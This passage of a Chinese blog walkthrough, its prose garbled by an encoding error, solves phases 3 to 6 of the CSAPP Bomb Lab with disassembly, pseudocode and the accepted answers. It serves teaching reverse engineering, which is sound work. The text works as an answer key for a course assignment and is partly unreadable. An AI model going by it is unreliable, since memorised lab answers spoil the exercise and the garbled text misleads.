explode_bomb();&#125;if (Mem[%rsp + 8] &gt; 7u) &#123; &#x2F;&#x2F; è¯»å–åˆ°çš„ï¼ˆè¾“å…¥çš„ï¼‰ç¬¬ä¸€ä¸ªå€¼å¤§äº7æˆ–å°äº0    explode_bomb();&#125;%eax &#x3D; Mem[%rsp + 8];switch (%rax) &#123;    case 0:        %eax &#x3D; 0xcf;  break;    case 1:        %eax &#x3D; 0x137; break;    case 2:        %eax &#x3D; 0x2c3; break;    case 3:        %eax &#x3D; 0x100; break;    case 4:        %eax &#x3D; 0x185; break;    case 5:        %eax &#x3D; 0xce;  break;    case 6:        %eax &#x3D; 0x2aa; break;    case 7:    %eax &#x3D; 0x147; break;&#125;&#x2F;&#x2F; è¾“å…¥çš„ç¬¬äºŒä¸ªå€¼ç­‰äº%eaxå¯„å­˜å™¨çš„å€¼if (%eax !&#x3D; Mem[%rsp + 12]) &#123;    explode_bomb();&#125;</code></pre><p>è¦ä½¿å¾— <code>%eax</code> çš„å€¼ç­‰äºè¾“å…¥çš„ç¬¬äºŒä¸ªå€¼ï¼Œåªéœ€è¦ä¿è¯è¾“å…¥çš„ç¬¬ä¸€ä¸ªå€¼ç»è¿‡ switch è¯­å¥é€‰æ‹©ä¹‹åï¼Œèµ‹å€¼æ­£å¥½ç­‰äºè¾“å…¥çš„ç¬¬äºŒä¸ªå€¼ã€‚</p><p>å› æ­¤æœ¬å…³çš„ç­”æ¡ˆå¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œ<code>0 207</code>ã€ <code>3 256</code> ç­‰ç­‰éƒ½æ˜¯æ­£ç¡®ç­”æ¡ˆã€‚æ³¨æ„ä¸èƒ½å†™æˆ <code>0 0xcf</code>ã€<code>3 0x100</code>ï¼Œå› ä¸ºè¾“å…¥æ ¼å¼ä¸ºåè¿›åˆ¶æ•´æ•°ï¼Œéœ€è¦å°†åå…­è¿›åˆ¶è¿›è¡Œè½¬æ¢ã€‚</p><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax0x0000000000401024 &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;0x0000000000401035 &lt;+41&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi0x0000000000401048 &lt;+60&gt;:    call   0x400fce &lt;func4&gt;0x000000000040104d &lt;+65&gt;:    test   %eax,%eax0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;0x0000000000401058 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp0x0000000000401061 &lt;+85&gt;:    ret</code></pre><p>è¿™ä¸€å…³ä¸»è¦åˆ†æˆä¸¤ä¸ªå‡½æ•°ï¼šphase_4 å’Œ func_4ï¼Œé¦–å…ˆæŸ¥çœ‹ phase_4ï¼Œä»£ç å‰ä¸€æ®µå’Œ phase_3 éå¸¸ç±»ä¼¼ï¼šè¯»å–ä¸¤ä¸ªæ•´æ•°ï¼Œä¸”ä¿è¯è¾“å…¥çš„ç¬¬ä¸€ä¸ªå€¼ä½äºåŒºé—´ <code>[0, 15)</code> å†…ã€‚</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;%rdx &#x3D; %rsp + 8;%esi &#x3D; 0x4025cf;%eax &#x3D; 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax !&#x3D; 2) &#123;    explode_bomb();&#125;if (Mem[%rsp + 8] &gt;&#x3D; 15u) &#123;explode_bomb();&#125;%edx &#x3D; 0xe;%esi &#x3D; 0;%edi &#x3D; Mem[%rsp + 8];func4(%rdi, %rsi, %rdx); &#x2F;&#x2F; func4(Mem[%rsp+8], 0, 14)if (%eax !&#x3D; 0) &#123;    explode_bomb();&#125;if (Mem[%rsp + 12] !&#x3D; 0) &#123;    explode_bomb();&#125;</code></pre><p>åä¸€æ®µä¾¿æ˜¯ä¼ é€’ 3 ä¸ªå‚æ•°ç»™å‡½æ•° func_4 è¿›è¡Œè°ƒç”¨ï¼Œéœ€è¦ä¿è¯è¿”å›å€¼å’Œè¾“å…¥çš„ç¬¬äºŒä¸ªæ•°ä¸º 0ï¼Œå› æ­¤å¯†ç çš„ç¬¬äºŒä¸ªæ•°ä¸º 0ã€‚å¯ä»¥çœ‹åˆ°ï¼Œphase_4 çš„ä»£ç ç»“æ„è¿˜æ˜¯å¾ˆç®€å•æ˜“æ‡‚çš„ï¼Œå…³é”®æ˜¯å¯¹ func_4 å‡½æ•°çš„åˆ†æã€‚</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax0x0000000000400fdd &lt;+15&gt;:    sar    %eax0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt;0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt;0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp0x000000000040100b &lt;+61&gt;:    ret</code></pre><p>ä»”ç»†è§‚å¯Ÿ func_4 çš„ä»£ç ï¼Œå‘ç°å«æœ‰å¯¹ func_4 çš„è°ƒç”¨ï¼Œå› æ­¤ func_4 æ˜¯ä¸€ä¸ª <strong>é€’å½’</strong> å‡½æ•°ã€‚åœ¨å¯¹é€’å½’å‡½æ•°è¿›è¡Œç¿»è¯‘æ—¶ï¼Œæœ¬è´¨ä¸Šä¸æ™®é€šçš„å‡½æ•°å¹¶æ²¡æœ‰åŒºåˆ«ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func4</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> c <span class="token operator">-</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span>res <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">;</span>    res <span class="token operator">+=</span> temp<span class="token punctuation">;</span>    res <span class="token operator">>>=</span> <span class="token number">1</span><span class="token punctuation">;</span>    temp <span class="token operator">=</span> b <span class="token operator">+</span> res<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">></span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        c <span class="token operator">=</span> temp <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        res <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">&lt;</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            b <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> res <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºçš„é€»è¾‘è¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œä½†æ˜¯æ³¨æ„åˆ°å‚æ•° b å’Œ c çš„å€¼éƒ½æ˜¯ç¡®å®šçš„ï¼ŒçœŸæ­£çš„å˜é‡åªæœ‰å‚æ•° aã€‚å› æ­¤è¿™é‡Œæœ‰ä¸€ä¸ªå·æ‡’çš„åŠæ³•ï¼šå°†ç¨‹åºç¿»è¯‘ä¸ºä¸€ä¸ªè¯­æ³•ä¸¥æ ¼æ­£ç¡®çš„é«˜çº§è¯­è¨€ç¨‹åºï¼ˆè€Œä¸æ˜¯ä¹‹å‰çš„ä¼ªä»£ç ï¼‰ï¼Œç„¶åæšä¸¾æ‰€æœ‰å¯èƒ½çš„ aï¼ˆåªæœ‰ 15 ä¸­æƒ…å†µï¼‰ï¼Œè¿è¡Œæµ‹è¯•å³å¯ï¼Œç»“æœä¸º 0 çš„å³ä¸ºæ»¡è¶³è¦æ±‚çš„å€¼ï¼Œä¹Ÿå°±æ˜¯å¯†ç çš„ç¬¬ä¸€ä¸ªæ•°ã€‚</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p4.png"></p><p>å¯è§ï¼Œæœ¬å…³çš„æ­£è§£åŒæ ·ä¸æ­¢ä¸€ä¸ªï¼Œ<code>1 0</code>ã€<code>3 0</code>ã€<code>7 0</code> éƒ½æ˜¯æ­£ç¡®ç­”æ¡ˆã€‚</p><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401062 &lt;+0&gt;:     push   %rbx0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt;0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp0x00000000004010f2 &lt;+144&gt;:   pop    %rbx0x00000000004010f3 &lt;+145&gt;:   ret</code></pre><p>è¿™ä¸€å…³çš„æ±‡ç¼–ä»£ç é€»è¾‘ä¸ç®—å¤æ‚ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ç¿»è¯‘åçš„ä»£ç ï¼š</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rbx &#x3D; %rdi;Mem[%rsp + 0x18] &#x3D; Mem[%fs + 0x28]; &#x2F;&#x2F; 4Byte%eax ^&#x3D; %eax;  &#x2F;&#x2F; %eax &#x3D; 0if (string_length() !&#x3D; 6) &#123;explode_bomb();&#125;for (%eax &#x3D; 0; %eax !&#x3D; 6; ++%eax) &#123;    %edx &#x3D; Mem[%rbx + %rax] &amp; 0xf;    Mem[%rsp + %rax + 0x10] &#x3D; Mem[0x4024b0 + %rdx]; &#x2F;&#x2F; 1Byte&#125;Mem[%rsp + 0x16] &#x3D; 0;%esi &#x3D; 0x40245e;%rdi &#x3D; %rsp + 0x10;if (string_not_equal(%rdi, %esi) !&#x3D; 0) &#123;explode_bomb();&#125;%rax &#x3D; Mem[%rsp + 0x18] ^ Mem[%fs + 0x28];if (%rax !&#x3D; 0) &#123;__stack_chk_fail();&#125;</code></pre><p>ä» <code>if (string_length() != 6) explode_bomb();</code> å¯ä»¥çœ‹å‡ºå¯†ç æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º 6 çš„å­—ç¬¦ä¸²ï¼Œéšåçš„ <code>for</code> å¾ªç¯éå†å­—ç¬¦ä¸²çš„å„ä¸ªå­—ç¬¦ï¼Œæå–ä½ä¸€å­—èŠ‚çš„å€¼ <code>%edx</code>ï¼Œå°†å…¶ä½œä¸ºç›¸å¯¹äºåœ°å€ <code>0x4024b0</code> çš„åç§»é‡ï¼Œè¯»å–ç›®æ ‡åœ°å€ <code>0x4020b0 + %rdx</code> å¤„çš„ä½ 4 ä½æ•°æ®ï¼Œå­˜å…¥åœ°å€ <code>%rsp + %rax + 0x10</code> å¤„ï¼Œæ„é€ å‡ºä¸€ä¸ªèµ·å§‹åœ°å€ä¸º <code>%rsp + 0x10</code> çš„é•¿åº¦ä¸º 6 çš„å­—ç¬¦ä¸²ã€‚ç„¶åå°†èµ·å§‹åœ°å€ä¸º <code>%rsp + 0x10</code> çš„å­—ç¬¦ä¸²ä¸èµ·å§‹åœ°å€ä¸º <code>0x40245e</code> çš„å­—ç¬¦ä¸²ä½œæ¯”è¾ƒï¼Œå¦‚æœä¸ç›¸åŒï¼Œåˆ™â€œå¼•çˆ†ç‚¸å¼¹â€ã€‚æœ€åè¿›è¡Œç¼“å†²åŒºæº¢å‡ºæ£€æµ‹ï¼Œå¦‚æœæº¢å‡ºï¼Œåˆ™è°ƒç”¨ <code>__stack_chk_fail()</code>.</p><p>ç»è¿‡ä»¥ä¸Šçš„æè¿°ï¼Œä¸éš¾çœ‹å‡ºè¾“å…¥çš„ 6 ä½å­—ç¬¦ä¸²å…¶å®æ˜¯ä¸€ä¸ªç›¸å¯¹äºæ•°ç»„ <code>0x4024b0</code> çš„ç´¢å¼•ï¼Œåªä¸è¿‡ç´¢å¼•å€¼ä¸ç›´æ¥ç»™å‡ºï¼Œè€Œæ˜¯ç­‰äºå­—ç¬¦çš„ä½ 4 ä½å€¼ã€‚æœ¬å…³çš„ç›®æ ‡ä¾¿æ˜¯ä½¿å¾—è¾“å…¥çš„ 6 ä½ç´¢å¼•ç»è¿‡æ˜ å°„ä¹‹åå¾—åˆ°çš„å­—ç¬¦ä¸²æ­£å¥½ç­‰äºåœ°å€ <code>0x40245e</code> çš„å­—ç¬¦ä¸²ï¼Œå³ &quot;flyers&quot;.</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p5.png"></p><p>ä»¥å­—ç¬¦ <em>f</em> ä¸ºä¾‹ï¼Œ<em>f</em> åœ¨ array è¡¨ä¸­çš„ï¼ˆæœ€å°ï¼‰ç´¢å¼•ä¸º 9ï¼Œè€Œæ‰€æœ‰ä½ 4 ä½ç­‰äº 9ï¼ˆ1001ï¼‰çš„å­—ç¬¦éƒ½æ»¡è¶³æ¡ä»¶ï¼Œä¾‹å¦‚ <em>i</em> .</p><table><thead><tr><th align="center">å­—ç¬¦c1</th><th align="center">ç´¢å¼•</th><th align="center">å­—ç¬¦c2</th></tr></thead><tbody><tr><td align="center">f</td><td align="center">9</td><td align="center">i</td></tr><tr><td align="center">l</td><td align="center">15</td><td align="center">o</td></tr><tr><td align="center">y</td><td align="center">14</td><td align="center">n</td></tr><tr><td align="center">e</td><td align="center">5</td><td align="center">e</td></tr><tr><td align="center">r</td><td align="center">6</td><td align="center">f</td></tr><tr><td align="center">s</td><td align="center">7</td><td align="center">g</td></tr></tbody></table><p>ä¾æ¬¡ç±»æ¨ï¼Œä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„å¯†ç ä¸ºï¼š<em>ionefg</em> .</p><h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><p>æœ€å¤æ‚çš„ä¸€å…³ï¼Œä»£ç é‡éå¸¸å¤§ï¼Œè€Œä¸”é€»è¾‘æ¯”è¾ƒå¤æ‚ï¼Œæ•´ä½“è§‚å¯Ÿæ¯”è¾ƒå›°éš¾ï¼Œå¯ä»¥å…ˆå°†ä»£ç æŒ‰ç…§å¾ªç¯å—æ‹†åˆ†ä¸ºå‡ ä¸ªéƒ¨åˆ†ï¼Œä¾æ¬¡è¿›è¡Œåˆ†æã€‚</p><p>åœ¨ä½¿ç”¨ GDB è°ƒè¯•çš„æ—¶å€™ï¼Œå¯ä»¥ä¸ºæ¯ä¸ªå—çš„èµ·å§‹éƒ¨åˆ†åˆ†åˆ«æ‰“ä¸Šæ–­ç‚¹ï¼ŒåŒæ—¶ä¸ºäº†è°ƒè¯•çš„æ–¹ä¾¿ï¼Œå¯å°†è¿™äº›å‘½ä»¤å†™å…¥ <code>.gdbinit</code> ä¸­ã€‚</p><pre class="language-shell" data-language="shell"><code class="language-shell">b phase_6b *0x401153b *0x40116fb *0x4011abb *0x4011d2r .&#x2F;ans.txt</code></pre><h2 id="block-1"><a href="#block-1" class="headerlink" title="block_1"></a>block_1</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004010f4 &lt;+0&gt;:     push   %r140x00000000004010f6 &lt;+2&gt;:     push   %r130x00000000004010f8 &lt;+4&gt;:     push   %r120x00000000004010fa &lt;+6&gt;:     push   %rbp0x00000000004010fb &lt;+7&gt;:     push   %rbx0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r130x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt;0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r140x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;0x000000000040114d &lt;+89&gt;:    add    $0x4,%r130x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</code></pre><p>ç¬¬ä¸€éƒ¨åˆ†æ•´ä½“è€Œè¨€ä¸ç®—å¤ªå¤æ‚ï¼Œç›´æ¥æŸ¥çœ‹ç¿»è¯‘åçš„ä»£ç ï¼š</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; è¯»å–6ä¸ª4Byteæ•°å­—æ”¾å…¥ä»%r14å¯„å­˜å™¨æŒ‡å‘åœ°å€å¼€å§‹çš„å†…å­˜ç©ºé—´ä¸­%r13 &#x3D; %rsp;%rsi &#x3D; %rsp;read_six_numbers();%r14 &#x3D; %rsp;for (%r12d &#x3D; 0; %r12 !&#x3D; 6; ) &#123;%rbp &#x3D; %r13;    %eax &#x3D; Mem[%r13];    %eax -&#x3D; 1;    if (%eax &gt; 5u) &#123;        explode_bomb();    &#125;    %r12d +&#x3D; 1;    if (%r12d &#x3D;&#x3D; 6) break;    for (%ebx &#x3D; %r12d; %ebx &lt;&#x3D; 5; ++%ebx) &#123;        %rax &#x3D; %ebx;  &#x2F;&#x2F; ç¬¦å·æ‰©å±•        %eax &#x3D; Mem[4 * %rax + %rsp];        if (Mem[%rbp] &#x3D;&#x3D; %eax) &#123;            explode_bomb();        &#125;&#125;%r13 +&#x3D; 4;&#125;</code></pre><p>ä¸ phase_2 ç±»ä¼¼ï¼Œé¦–å…ˆè¯»å– 6 ä¸ªæ•°å­—ï¼Œç¡®å®šå¯†ç ç”± 6 ä¸ªæ•°å­—ç»„æˆã€‚</p><p>éšåä¸»è¦å…³æ³¨å¾ªç¯ä¸­å¯¼è‡´è§¦å‘ <code>explode_bomb</code> çš„æ¡ä»¶ï¼Œè¿™äº›æ¡ä»¶æŒ‡æ˜äº†å¯†ç çš„é™å®šèŒƒå›´ã€‚ç¬¬ä¸€ä¸ªæ˜¯ <code>%eax &gt; 5u</code>ï¼Œæ³¨æ„å‰ä¸€æ¡æŒ‡ä»¤æ˜¯ <code>%eax</code> è‡ªå‡ä¸€ï¼Œå› æ­¤å¯ä»¥ç¡®å®š 6 ä¸ªæ•°å­—çš„èŒƒå›´éƒ½æ˜¯ <code>[1, 6]</code>.</p><blockquote><p>è¿™é‡Œè‡ªå‡ä¸€å¾ˆæœ‰æ„æ€ï¼Œåˆšå¼€å§‹çœ‹å¯èƒ½ä»¥ä¸ºæ˜¯å¤šæ­¤ä¸€ä¸¾ï¼Œç›´æ¥åˆ¤æ–­ %eax æ˜¯å¦å¤§äº 6u ä¸å°±å®Œäº†å—ï¼Ÿä½†æ˜¯è€ƒè™‘åˆ° 0 è¿™ä¸ªç‰¹ä¾‹ï¼Œå®ƒåœ¨è‡ªå‡ä¸€åå¾—åˆ° -1ï¼Œè€Œ -1 æ»¡è¶³æ— ç¬¦å·æ¯”è¾ƒå¤§äº 5uï¼Œå› æ­¤è¢«æ’é™¤åœ¨å¤–ã€‚å¦‚æœç›´æ¥åˆ¤æ–­ %eax æ˜¯å¦å¤§äº 6uï¼Œé‚£ä¹ˆæ•°å­—çš„é™å®šèŒƒå›´å°±å˜æˆäº† [0, 6].</p></blockquote><p>åé¢çš„å†…å±‚å¾ªç¯ä¸éš¾çœ‹å‡ºæ˜¯ç”¨æ¥åˆ¤é‡çš„ï¼Œå› æ­¤å…­ä¸ªæ•°å­—çš„èŒƒå›´å¾—ä»¥ç¡®å®šï¼šæ¯ä¸ªæ•°å­—éƒ½ä½äºåŒºé—´ <code>[1, 6]</code> å†…ä¸”æ— é‡å¤æ•°å­—ã€‚</p><h2 id="block-2"><a href="#block-2" class="headerlink" title="block_2"></a>block_2</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; %r14 &#x3D; %rsp&#x2F;&#x2F; éå†6ä¸ªæ•°å­—ï¼Œæ¯ä¸ªæ•°å­—numçš„å€¼å˜ä¸º7-num%ecx &#x3D; 7;for (%rax &#x3D; %r14, %rsi &#x3D; %rsp + 0x18; %rax !&#x3D; %rsi; %rax +&#x3D; 4) &#123;%edx &#x3D; %ecx - Mem[%rax];Mem[%rax] &#x3D; %edx;&#125;</code></pre><p>ç¬¬äºŒéƒ¨åˆ†éå¸¸ç®€å•ï¼Œéå†è¾“å…¥çš„ 6 ä¸ªæ•°å­—ï¼Œå°†æ¯ä¸ªæ•°å­— num æ›´æ”¹ä¸º 7 - num.</p><h2 id="block-3"><a href="#block-3" class="headerlink" title="block_3"></a>block_3</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</code></pre><p>ç¬¬ä¸‰éƒ¨åˆ†è™½ç„¶ä»£ç 